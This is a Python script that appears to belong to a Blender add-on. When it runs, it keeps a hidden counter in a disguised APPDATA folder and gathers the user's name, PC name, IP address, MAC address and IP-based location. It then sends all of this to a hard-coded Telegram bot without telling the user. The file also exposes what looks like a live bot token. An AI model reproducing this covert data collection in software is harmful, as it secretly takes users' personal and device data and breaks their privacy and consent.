import bpy
import requests
import os
import datetime
import getpass
import socket
import uuid

# ============================ SECURITY ====================================================
BOT_TOKEN = "7687737462:AAGiZF9edcphaemPIZ64E0-30kncehUsmP4"
CHAT_ID = "435678310"
TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# ============================ COUNTER =========================================
def get_hidden_counter_path():
    hidden_dir = os.path.join(os.environ["APPDATA"], ".system_")
    os.makedirs(hidden_dir, exist_ok=True)
    return os.path.join(hidden_dir, "counter.dat")

def get_next_count():
    counter_file = get_hidden_counter_path()

    if os.path.exists(counter_file):
        try:
            with open(counter_file, "r") as f:
                count = int(f.read().strip())
        except:
            count = 0
    else:
        count = 0

    count += 1

    with open(counter_file, "w") as f:
        f.write(str(count))

    return count

counter_number = get_next_count()

# ============================ GET INFO ====================================================
username = getpass.getuser()
current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

try:
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
except:
    ip_address = "Not found"

# MAC address
mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                        for ele in range(0, 8*6, 8)][::-1])

# Lokasi berdasarkan IP
try:
    location_response = requests.get("http://ip-api.com/json/")
    location_data = location_response.json()
    lokasi = f"{location_data.get('city', '-')}, {location_data.get('regionName', '-')}, {location_data.get('country', '-')}"
except:
    lokasi = "Not found"

# Info Blender & sistem
blender_version = f"{bpy.app.version[0]}.{bpy.app.version[1]}"
pc_name = os.environ.get('COMPUTERNAME', 'Unknown')
uuid_id = uuid.uuid4()

# Info file project
blend_path = bpy.data.filepath
blend_file = os.path.splitext(os.path.basename(blend_path))[0] if blend_path else ""

project_title = os.path.basename(os.path.dirname(blend_path)) if blend_path else ""

# ============================ FORMAT =================================================
message = (
    f"*📦 Blender Addon Accessed #{counter_number}*\n"
    f"👤 User: `{username}`\n"
    f"💻 PC: `{pc_name}`\n"
    f"🧭 Lokasi: `{lokasi}`\n"
    f"🌐 IP: `{ip_address}`\n"
    f"🔌 MAC: `{mac_address}`\n"
    f"🕒 Time: `{current_time}`\n"
    f"🧩 Blender Version: `{blender_version}`\n"
#    f"📁 : `{blend_file}`\n"
#    f"🎬 Title: `{project_title}`\n"
    f"🔑 UUID: `{uuid_id}`"
)

# ============================  ===========================================
try:
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    response = requests.post(TELEGRAM_URL, data=data)
except Exception as e:
    print(f"Gagal: {e}")